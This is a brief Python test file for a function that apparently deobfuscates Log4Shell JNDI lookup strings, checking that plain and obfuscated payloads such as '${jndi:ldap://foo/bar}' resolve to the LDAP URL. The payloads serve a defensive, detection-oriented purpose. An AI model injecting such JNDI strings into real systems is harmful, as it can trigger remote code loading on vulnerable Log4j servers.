from sampleloader.lookups import Log4jLookup

def test_simple():
    assert Log4jLookup("${jndi:ldap://foo/bar}") == "ldap://foo/bar"

def test_obfusc_colons():
    assert Log4jLookup("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://foo/bar") == "ldap://foo/bar"

def test_obfusc_lower():
    assert Log4jLookup("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://foo/bar}") == "ldap://foo/bar"